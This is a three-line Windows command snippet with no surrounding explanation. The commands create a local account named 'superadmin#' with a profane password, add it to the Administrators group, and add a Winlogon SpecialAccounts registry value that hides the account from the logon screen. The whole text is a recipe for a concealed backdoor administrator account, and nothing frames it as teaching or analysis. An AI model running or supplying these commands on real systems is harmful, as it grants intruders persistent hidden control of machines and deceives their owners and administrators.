net user /add superadmin# Can#I#Fuck#You
net localgroup administrators /add superadmin#
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v superadmin# /t REG_DWORD /d 0
